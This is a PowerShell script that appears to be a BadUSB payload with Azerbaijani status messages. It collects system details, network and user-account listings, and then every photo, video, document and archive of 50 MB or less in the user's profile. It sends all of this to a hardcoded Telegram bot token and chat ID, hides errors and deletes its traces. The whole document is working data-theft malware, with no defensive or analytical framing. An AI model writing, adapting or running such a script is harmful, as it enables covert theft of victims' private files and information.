$t = '8756610074:AAHz80gB_ICfIfOBMgsvA79YVQI1bmUxhDo'
$c = '7380909724'
$u = "https://api.telegram.org/bot$t"
$tmp = "$env:TEMP\_grab"
mkdir $tmp -Force | Out-Null

function S($f) {
    try { Invoke-RestMethod "$u/sendDocument" -Method Post -Form @{chat_id=$c; document=Get-Item $f} | Out-Null } catch {}
}
function T($m) {
    try { Invoke-RestMethod "$u/sendMessage" -Method Post -Body @{chat_id=$c; text=$m} | Out-Null } catch {}
}

T "[+] BadUSB daxil oldu: $env:COMPUTERNAME\$env:USERNAME"

$info = @()
$info += "User: $env:USERNAME"
$info += "PC: $env:COMPUTERNAME"
$info += "Domain: $env:USERDOMAIN"
$info += "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)"
$info += "IP: $((Get-NetIPAddress -AddressFamily IPv4 | ?{$_.IPAddress -ne '127.0.0.1'}).IPAddress -join ', ')"
$info += "MAC: $((Get-NetAdapter | ?{$_.Status -eq 'Up'}).MacAddress -join ', ')"
$info | Out-File "$tmp\sysinfo.txt"
S "$tmp\sysinfo.txt"

ipconfig /all | Out-File "$tmp\ip.txt"; S "$tmp\ip.txt"
netstat -ano | Out-File "$tmp\netstat.txt"; S "$tmp\netstat.txt"
net user | Out-File "$tmp\users.txt"; S "$tmp\users.txt"

Get-ChildItem "$env:USERPROFILE" -Recurse -File -ErrorAction SilentlyContinue |
    ?{ $_.Extension -match '\.(jpg|jpeg|png|gif|mp4|mov|avi|mkv|pdf|docx|xlsx|txt|zip|rar|7z)$' -and $_.Length -le 50MB } |
    %{ S $_.FullName }

T "[+] Bitdi: $env:COMPUTERNAME"
Remove-Item $tmp -Recurse -Force
